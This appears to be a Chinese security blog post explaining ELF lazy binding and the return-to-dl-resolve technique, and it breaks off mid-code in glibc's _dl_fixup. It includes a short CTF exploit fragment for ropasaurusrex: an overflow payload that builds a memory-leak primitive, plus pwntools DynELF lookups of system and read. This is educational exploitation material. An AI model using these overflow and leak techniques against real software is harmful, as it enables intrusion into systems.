<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>A Trip of Symbol Resolution - B3ale</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Monday, April 6th 2020, 4:04 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    7.2k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      37 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。</p>
<a id="more"></a>
<h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：</p>
<pre><code>all: a
a: a.c
        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g
</code></pre><p>使用 apt 安装的 gdb 在 <code>_dl_fixup()</code> 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：</p>
<pre><code class="cpp">...
6501   /* If we are stepping at the source level and entered the runtime
6502      loader dynamic symbol resolution code...
6503
6504      EXEC_FORWARD: we keep on single stepping until we exit the run
6505      time loader code and reach the callee&#39;s address.
6506
6507      EXEC_REVERSE: we&#39;ve already executed the callee (backward), and
6508      the runtime loader code is handled just like any other
6509      undebuggable function call.  Now we need only keep stepping
6510      backward through the trampoline code, and that&#39;s handled further
6511      down, so there is nothing for us to do here.  */
6512
6513   static int env_debug_resolver = -1;
6514   if (env_debug_resolver == -1) {
6515     char *env_debug_resolver_str = getenv(&quot;DEBUG_RESOLVER&quot;);
6516     if (env_debug_resolver_str &amp;&amp; !strcmp(env_debug_resolver_str, &quot;1&quot;)) {
6517       env_debug_resolver = 1;
6518     } else {
6519       env_debug_resolver = 0;
6520     }
6521   }
6522   if (execution_direction != EXEC_REVERSE
6523       &amp;&amp; ecs-&gt;event_thread-&gt;control.step_over_calls == STEP_OVER_UNDEBUGGABLE
6524       &amp;&amp; env_debug_resolver == 0
6525       &amp;&amp; in_solib_dynsym_resolve_code (stop_pc))
6526     {
6527       CORE_ADDR pc_after_resolver =
6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);
...
</code></pre>
<p>生成 Makefile 时必须添加 <code>--enable-tui</code> 才会有 layout 的界面（编译的时候使用系统默认 python 版本，如果需要 pwndbg、gef 之类的插件就必须用 python3）：</p>
<pre><code class="bash">../configure --enable-tui --with-python=/usr/bin/python2.7
</code></pre>
<p>如果在最后安装 gdb 的时候出现 <code>makeinfo: not found</code>，只需要装个 <code>texinfo</code> 即可：</p>
<pre><code class="bash">/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not found
WARNING: &#39;makeinfo&#39; is missing on your system.
         You should only need it if you modified a &#39;.texi&#39; file, or
         any other file indirectly affecting the aspect of the manual.
         You might want to install the Texinfo package:
         &lt;http://www.gnu.org/software/texinfo/&gt;
         The spurious makeinfo call might also be the consequence of
         using a buggy &#39;make&#39; (AIX, DU, IRIX), in which case you might
         want to install GNU make:
         &lt;http://www.gnu.org/software/make/&gt;
Makefile:503: recipe for target &#39;gdb.info&#39; failed
make[5]: *** [gdb.info] Error 127
make[5]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb/doc&#39;
Makefile:1505: recipe for target &#39;subdir_do&#39; failed
make[4]: *** [subdir_do] Error 1
make[4]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;
Makefile:1240: recipe for target &#39;install-only&#39; failed
make[3]: *** [install-only] Error 2
make[3]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;
Makefile:1237: recipe for target &#39;install&#39; failed
make[2]: *** [install] Error 2
make[2]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;
Makefile:9185: recipe for target &#39;install-gdb&#39; failed
make[1]: *** [install-gdb] Error 2
make[1]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build&#39;
Makefile:2248: recipe for target &#39;install&#39; failed
make: *** [install] Error 2
</code></pre>
<p>在需要调试 <code>_dl_fixup()</code> 时只需要 export 一个环境变量即可：</p>
<pre><code class="bash">export DEBUG_RESOLVER=1
</code></pre>
<p>对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：</p>
<pre><code class="bash">sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary
</code></pre>
<h1 id="How-DynELF-Works"><a href="#How-DynELF-Works" class="headerlink" title="How DynELF Works?"></a>How DynELF Works?</h1><p>在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。</p>
<h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF-2013-ropasaurusrex"></a>PlaidCTF-2013-ropasaurusrex</h2><p>以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：</p>
<pre><code class="cpp">ssize_t __cdecl main()
{
  vul();
  return write(1, &quot;WIN\n&quot;, 4u);
}

ssize_t vul()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &amp;buf, 0x100u);
}
</code></pre>
<p>通过溢出可以修改返回地址为 <code>start</code>，来构造无限次输入；同时可以跳 <code>write</code> 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：</p>
<pre><code class="python">elf = ELF(&#39;./ropasaurusrex&#39;)

write_plt = elf.plt[&#39;write&#39;]
start_addr = 0x8048340

def leak(addr):
    payload = flat(
        &#39;A&#39; * 140,
        write_plt,
        start_addr,
        1,
        addr,
        4
    )
    p.sendline(payload)
    data = p.recv(4)
    info(hex(addr) + &#39; ==&gt; &#39; + data)
    return data
</code></pre>
<p>使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：</p>
<pre><code class="python">#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrex
prog = DynELF(leak, 0x8048000)
bases = prog.bases()
info(bases)
for l in bases:
    if &#39;libc.so.6&#39; in l:
        ptr = bases[l]
info(&#39;ptr =&gt; &#39; + hex(ptr))
</code></pre>
<p>然后从 libc 基址开始使用 DynELF 找到 <code>system</code> 和 <code>read</code> 的地址：</p>
<pre><code class="python">libc = DynELF(leak, ptr)
system_addr = libc.lookup(&#39;system&#39;)
read_addr = libc.lookup(&#39;read&#39;)
</code></pre>
<h2 id="Lazy-Symbol-Binding"><a href="#Lazy-Symbol-Binding" class="headerlink" title="Lazy Symbol Binding"></a>Lazy Symbol Binding</h2><p>接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：</p>
<ul>
<li>程序启动时，外部函数的地址未知（比如说在 libc 中的函数）</li>
<li>只有动态链接的程序需要解析函数地址，静态链接的程序不需要</li>
<li>函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位</li>
</ul>
<h2 id="ELF-Structure"><a href="#ELF-Structure" class="headerlink" title="ELF Structure"></a>ELF Structure</h2><p>接下来了解一下 ELF 文件的结构。结构体在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>glibc/elf/elf.h</code></a> 中。</p>
<p>笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：</p>
<pre><code>             Linking View                        Execution View
       +----------------------+             +----------------------+
       |      ELF Header      |  ---+ +---  |      ELF Header      |
       |----------------------|     | |     |----------------------|
       | Program Header Table |     | +---&gt; | Program Header Table |  ---+
       |      (optional)      |     |       |----------------------|     |
       |----------------------|     |       |                      |     |
 +---&gt; |      Section 1       | ----|-----&gt; |      Segment 1       | &lt;---|
 |     |----------------------|     | |     |                      |     |
 |     |         ...          | ----|-+     |----------------------|     |
 |     |----------------------|     |       |                      |     |
 |---&gt; |      Section n       | ----|-----&gt; |      Segment 2       | &lt;---+
 |     |----------------------|     | |     |                      |
 |     |         ...          | ----|-+     |----------------------|
 |     |----------------------|     |       | Section Header Table |
 +---  | Section Header Table | &lt;---+       |      (optional)      |
       +----------------------+             +----------------------+
</code></pre><p>几个部分大概的描述如下：</p>
<ul>
<li>Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）<ul>
<li><code>objdump -j .got.plt -s ./</code></li>
</ul>
</li>
<li>Segment（段）：包含多个 Section 的连续内存</li>
<li>Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中</li>
</ul>
<p>ELF Header 中，<code>e_ident</code> 存储了 Magic Number 即 <code>&quot;\x7fELF&quot;</code>，<code>e_machine</code> 即程序对应的架构，<code>e_entry</code> 存储了程序的入口点，<code>e_phoff</code> 和 <code>e_shoff</code> 分别存储了 Program Header Table 和 Section Header Table 的偏移，<code>e_phentsize</code> 和 <code>e_shentsize</code> 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，<code>e_phnum</code> 和 <code>e_shnum</code> 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：</p>
<pre><code class="cpp">typedef struct
{
  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */
  Elf32_Half        e_type;                        /* Object file type */
  Elf32_Half        e_machine;                /* Architecture */
  Elf32_Word        e_version;                /* Object file version */
  Elf32_Addr        e_entry;                /* Entry point virtual address */
  Elf32_Off        e_phoff;                /* Program header table file offset */
  Elf32_Off        e_shoff;                /* Section header table file offset */
  Elf32_Word        e_flags;                /* Processor-specific flags */
  Elf32_Half        e_ehsize;                /* ELF header size in bytes */
  Elf32_Half        e_phentsize;                /* Program header table entry size */
  Elf32_Half        e_phnum;                /* Program header table entry count */
  Elf32_Half        e_shentsize;                /* Section header table entry size */
  Elf32_Half        e_shnum;                /* Section header table entry count */
  Elf32_Half        e_shstrndx;                /* Section header string table index */
} Elf32_Ehdr;
typedef struct
{
  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */
  Elf64_Half        e_type;                        /* Object file type */
  Elf64_Half        e_machine;                /* Architecture */
  Elf64_Word        e_version;                /* Object file version */
  Elf64_Addr        e_entry;                /* Entry point virtual address */
  Elf64_Off        e_phoff;                /* Program header table file offset */
  Elf64_Off        e_shoff;                /* Section header table file offset */
  Elf64_Word        e_flags;                /* Processor-specific flags */
  Elf64_Half        e_ehsize;                /* ELF header size in bytes */
  Elf64_Half        e_phentsize;                /* Program header table entry size */
  Elf64_Half        e_phnum;                /* Program header table entry count */
  Elf64_Half        e_shentsize;                /* Section header table entry size */
  Elf64_Half        e_shnum;                /* Section header table entry count */
  Elf64_Half        e_shstrndx;                /* Section header string table index */
} Elf64_Ehdr;
</code></pre>
<p>Section Header Table 是一个 <code>Elf64_Shdr</code>（<code>Elf32_Shdr</code>）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：</p>
<pre><code class="cpp">/* Section header.  */
typedef struct
{
  Elf32_Word        sh_name;                /* Section name (string tbl index) */
  Elf32_Word        sh_type;                /* Section type */
  Elf32_Word        sh_flags;                /* Section flags */
  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf32_Off        sh_offset;                /* Section file offset */
  Elf32_Word        sh_size;                /* Section size in bytes */
  Elf32_Word        sh_link;                /* Link to another section */
  Elf32_Word        sh_info;                /* Additional section information */
  Elf32_Word        sh_addralign;                /* Section alignment */
  Elf32_Word        sh_entsize;                /* Entry size if section holds table */
} Elf32_Shdr;
typedef struct
{
  Elf64_Word        sh_name;                /* Section name (string tbl index) */
  Elf64_Word        sh_type;                /* Section type */
  Elf64_Xword        sh_flags;                /* Section flags */
  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */
  Elf64_Off        sh_offset;                /* Section file offset */
  Elf64_Xword        sh_size;                /* Section size in bytes */
  Elf64_Word        sh_link;                /* Link to another section */
  Elf64_Word        sh_info;                /* Additional section information */
  Elf64_Xword        sh_addralign;                /* Section alignment */
  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */
} Elf64_Shdr;
</code></pre>
<p>Program Header Table 是一个 <code>Elf64_Phdr</code>（<code>Elf32_Phdr</code>）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：</p>
<pre><code class="cpp">/* Program segment header.  */
typedef struct
{
  Elf32_Word        p_type;                        /* Segment type */
  Elf32_Off        p_offset;                /* Segment file offset */
  Elf32_Addr        p_vaddr;                /* Segment virtual address */
  Elf32_Addr        p_paddr;                /* Segment physical address */
  Elf32_Word        p_filesz;                /* Segment size in file */
  Elf32_Word        p_memsz;                /* Segment size in memory */
  Elf32_Word        p_flags;                /* Segment flags */
  Elf32_Word        p_align;                /* Segment alignment */
} Elf32_Phdr;
typedef struct
{
  Elf64_Word        p_type;                        /* Segment type */
  Elf64_Word        p_flags;                /* Segment flags */
  Elf64_Off        p_offset;                /* Segment file offset */
  Elf64_Addr        p_vaddr;                /* Segment virtual address */
  Elf64_Addr        p_paddr;                /* Segment physical address */
  Elf64_Xword        p_filesz;                /* Segment size in file */
  Elf64_Xword        p_memsz;                /* Segment size in memory */
  Elf64_Xword        p_align;                /* Segment alignment */
} Elf64_Phdr;
</code></pre>
<h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p><code>.dynamic</code> 是一个 <code>Elf64_Dyn</code>（<code>Elf32_Dyn</code>）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 <code>p_type</code> 值为 <code>PT_DYNAMIC</code> 的 Program Header。Program Header Table 的基址加上 <code>p_offset</code> 的结果就是 <code>.dynamic</code> 的地址。其中的 <code>union</code> 里用 <code>d_val</code> 还是 <code>d_ptr</code> 取决于 <code>d_tag</code>（<code>DT_xxx</code>）：</p>
<pre><code class="cpp">/* Dynamic section entry.  */
typedef struct
{
  Elf32_Sword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf32_Word d_val;                        /* Integer value */
      Elf32_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf32_Dyn;
typedef struct
{
  Elf64_Sxword        d_tag;                        /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;                /* Integer value */
      Elf64_Addr d_ptr;                        /* Address value */
    } d_un;
} Elf64_Dyn;
</code></pre>
<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p><code>.dynsym</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_SYMTAB</code> 的 entry，<code>d_ptr</code> 指向 <code>.dynsym</code> Section（<code>Elf64_Sym</code> 或 <code>Elf32_Sym</code> 数组）。其中 <code>st_name</code> 指向 Symbol Name：</p>
<pre><code class="cpp">/* Symbol table entry.  */
typedef struct
{
  Elf32_Word        st_name;                /* Symbol name (string tbl index) */
  Elf32_Addr        st_value;                /* Symbol value */
  Elf32_Word        st_size;                /* Symbol size */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char        st_other;                /* Symbol visibility */
  Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym;
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
</code></pre>
<h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p><code>.dynstr</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_STRTAB</code> 的 entry，是 <code>.dynsym</code> 中 <code>st_name</code> 对应的字符串表（<code>name = (char *)(.dynstr+.dynsym[xx]-&gt;st_name)</code>）。</p>
<h4 id="rel-plt（-rela-plt）"><a href="#rel-plt（-rela-plt）" class="headerlink" title=".rel.plt（.rela.plt）"></a><code>.rel.plt</code>（<code>.rela.plt</code>）</h4><p><code>.rel.plt</code>（<code>.rela.plt</code>）是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_JMPREL</code> 的 entry，对应的结构体是 <code>Elf64_Rela</code>（<code>Elf32_Rel</code>）。<code>XX_Rela</code> 相比 <code>XX_Rel</code> 多了一个没什么用处的 <code>r_addend</code>，测试的时候发现 32 位程序用的是 <code>Elf32_Rel</code>，而 64 位程序用的是 <code>Elf64_Rela</code>。<code>r_offset</code> 为需要重定位的地址的偏移，即 <code>.got.plt</code>（GOT）；<code>r_info</code> 中包含 Symbol Index（Symbol Index 即为 <code>.dynsym</code> 中的 Section Index）。<code>ELF64_R_SYM</code>（<code>#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code>）用来取高 32bit；<code>ELF32_R_SYM</code>（<code>#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</code>）用来取高 24bit：</p>
<pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
} Elf32_Rel;
/* I have seen two different definitions of the Elf64_Rel and
   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or
   whoever) gets their act together.  */
/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
} Elf64_Rel;
/* Relocation table entry with addend (in section of type SHT_RELA).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                        /* Relocation type and symbol index */
  Elf32_Sword        r_addend;                /* Addend */
} Elf32_Rela;
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
</code></pre>
<h2 id="Symbol-Resolve"><a href="#Symbol-Resolve" class="headerlink" title="Symbol Resolve"></a>Symbol Resolve</h2><p>接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 中的第二条指令（<code>XX@plt+6</code>）；第二条指令 <code>PUSH reloc_arg</code>（如果用 <code>.rel.plt</code> 则 <code>reloc_arg</code> 是 <code>offset</code>；如果是 <code>rela.plt.</code> 则是 <code>index</code>）；第三条指令 JMP 至 PLT 中的第一行（<code>PLT0</code>）。</p>
<p>接下来在 <code>PLT0</code> 中，第一条指令 <code>PUSH GOT1</code> 把 <code>link_map</code> 结构体入栈（64 位在调用 <code>_dl_fixup()</code> 之前会把栈上的 <code>link_map</code> 和 <code>reloc_arg</code> 分别复制给 rdi 和 rsi）；第二条指令 <code>JMP GOT2</code> 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 <code>_dl_runtime_resolve()</code>）</p>
<h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve()"></a><code>_dl_runtime_resolve()</code></h3><p><code>_dl_runtime_resolve()</code> 函数是 Symbol 的解析器，它将 <code>link_map</code> 和 <code>reloc_arg</code> 作为参数传入 <code>_dl_fixup()</code>，并在 <code>_dl_fixup()</code> 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。</p>
<p>Resolver 先根据 reloc_arg 定位到 <code>.rel.plt</code>（<code>.rela.plt</code>），然后根据 <code>r_info</code> 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 <code>r_offset</code> 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：</p>
<pre><code>_dl_runtime_resolve(link_map, reloc_arg)
            __________            |
           |Elf64_Rela| &lt;---------+
           |----------|
      +--- | r_offset |         ___________
      |    |  r_info  | -----&gt; | Elf64_Sym |          ____________
      |    |__________|        |-----------|         |            |
      |                        |  st_name  | ------&gt; | printf\x00 |
      |      .rel.plt          |___________|         |____________|
      v
  __________                     .dynsym                .dynstr
 |          |
 | &lt;printf&gt; |
 |__________|

   .got.plt
</code></pre><p>其中 <code>link_map</code> 中包括了所有已加载的 ELF 信息。</p>
<h4 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h4><p><code>link_map</code> 结构体在 <a href="https://code.woboq.org/userspace/glibc/include/link.h.html" target="_blank" rel="noopener"><code>glibc/include/link.h</code></a> 中实现。其中，<code>l_next</code> 作为指针连接所有载入的 Library；<code>l_name</code> 存储了 Library 的名字；<code>l_addr</code> 中存储了该 Library 的基址；<code>l_info[x]</code> 则指向 <code>.dynamic</code> 中的数据，<code>x</code> 即为 <code>d_tag</code>，可以用来获取 Library 中的指定 Section：</p>
<pre><code class="cpp">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;
   members form a chain of all the shared objects loaded at startup.
   These data structures exist in space used by the run-time dynamic linker;
   modifying them may have disastrous results.
   This data structure might change in future, if necessary.  User-level
   programs must avoid defining objects of this type.  */
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;                /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */
    ElfW(Addr) l_entry;                /* Entry point location.  */
    ElfW(Half) l_phnum;                /* Number of program header entries.  */
    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */
    ...
    /* Pointer to the version information if available.  */
    ElfW(Versym) *l_versyms;
    ...
  };
</code></pre>
<h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup()"></a><code>_dl_fixup()</code></h4><p><code>_dl_fixup()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现。通过 <code>reloc_arg</code> 在 <code>link_map</code> 中获取相应的 <code>symtab</code>（<code>.dynsym</code> 数组）、<code>strtab</code>（<code>.dynstr</code>）、<code>reloc</code>（<code>.rel.plt</code> 或 <code>.rela.plt</code>）、<code>sym</code>（根据 <code>reloc</code> 中的 <code>r_info</code> 得到对应的 <code>.dynsym</code> 元素）。然后会有一系列的检查，通过检查后根据 <code>strtab + sym-&gt;st_name</code> 的 Symbol Name 查找到对应的地址，最后填入 GOT：</p>
<pre><code class="cpp">/* This function is called through a special trampoline from the PLT the
   first time each PLT entry is called.  We must perform the relocation
   specified in the PLT of the given shared object, and return the resolved
   function address to the trampoline, which will restart the original call
   to that address.  Future calls will bounce directly from the PLT to the
   function.  */

DL_FIXUP_VALUE_TYPE
__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
       ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
       struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  // 通过reloc-&gt;r_info找到.dynsym中对应的部分
  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  // 检查reloc-&gt;r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）
